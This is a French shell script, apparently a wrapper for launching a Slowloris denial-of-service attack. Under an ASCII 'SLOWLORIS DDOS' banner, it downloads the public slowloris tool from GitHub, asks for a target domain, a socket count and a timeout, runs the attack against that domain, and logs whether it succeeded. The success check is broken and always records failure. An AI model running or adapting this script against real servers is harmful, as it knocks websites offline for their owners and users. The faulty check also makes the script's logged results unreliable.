#!/bin/sh

# Define ANSI color variables
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
NC='\033[0m'
origIFS="${IFS}"







echo "${GREEN}  ██████  ██▓     ▒█████   █     █░ ██▓     ▒█████   ██▀███   ██▓  ██████    ▓█████▄ ▓█████▄  ▒█████    ██████" 
echo "${GREEN}▒██    ▒ ▓██▒    ▒██▒  ██▒▓█░ █ ░█░▓██▒    ▒██▒  ██▒▓██ ▒ ██▒▓██▒▒██    ▒    ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ "
echo "${GREEN}░ ▓██▄   ▒██░    ▒██░  ██▒▒█░ █ ░█ ▒██░    ▒██░  ██▒▓██ ░▄█ ▒▒██▒░ ▓██▄      ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   "
echo "${GREEN}  ▒   ██▒▒██░    ▒██   ██░░█░ █ ░█ ▒██░    ▒██   ██░▒██▀▀█▄  ░██░  ▒   ██▒   ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒"
echo "${GREEN}▒██████▒▒░██████▒░ ████▓▒░░░██▒██▓ ░██████▒░ ████▓▒░░██▓ ▒██▒░██░▒██████▒▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒"
echo "${GREEN}▒ ▒▓▒ ▒ ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ▓░▒ ▒  ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░▓  ▒ ▒▓▒ ▒ ░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░"
echo "${GREEN}░ ░▒  ░ ░░ ░ ▒  ░  ░ ▒ ▒░   ▒ ░ ░  ░ ░ ▒  ░  ░ ▒ ▒░   ░▒ ░ ▒░ ▒ ░░ ░▒  ░ ░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░"
echo "${GREEN}░  ░  ░    ░ ░   ░ ░ ░ ▒    ░   ░    ░ ░   ░ ░ ░ ▒    ░░   ░  ▒ ░░  ░  ░      ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  "
echo "${GREEN}      ░      ░  ░    ░ ░      ░        ░  ░    ░ ░     ░      ░        ░        ░       ░        ░ ░        ░  "
echo "${GREEN}                                                                              ░       ░                        "                                                                                                                
                                                                                                                          
                                                                                                                          


echo "\n"





if command -v git &> /dev/null
then
    echo "${NC}Git est installé sur votre système."
else
    echo "${NC}Git n'est pas installé sur votre système."
    apt install git 
fi

filename="slowloris-master"

# Vérifier si le fichier existe parmi tous les fichiers du répertoire
if [ $(find . -name "$filename" | wc -l) -gt 0 ]; then
    echo "Le fichier $filename existe dans ce répertoire."
    echo "Nous pouvons passer à la suite."

else
    echo "Le fichier $filename n'existe pas dans ce répertoire."
    wget https://github.com/gkbrk/slowloris/archive/master.zip
    unzip master.zip
fi

sleep 2

cd $filename
echo "Veuillez renseigner le FQDN de la cible :"
read cible 

echo "Veuillez renseigner le nombre de paquets :"
read paquet

echo "Veuillez renseigner le timeout :"
read TIMEOUT

./slowloris.py "$cible" -s "$paquet" &  # Exécute slowloris.py en arrière-plan
PID=$!

# Attendre que Slowloris se termine
sleep "$TIMEOUT"


# Vérifier si Slowloris a réussi ou échoué
attack_success=false

netstat -an | grep ":80" | grep ESTABLISHED > /dev/null
if [ "$attack_success" = true ]; then
    echo "Slowloris a réussi pour le domaine $cible avec une charge de $paquet paquets avec un timeout de $TIMEOUT" >> "$(echo $PWD)/txt/slowloris.txt"
else
    echo "Slowloris a échoué pour le domaine $cible" >> "$(echo $PWD)/txt/slowloris.txt"
fi

# Terminer la tâche qui s'exécute en arrière-plan
kill "$PID"

echo "Fin du programme"
exit 0


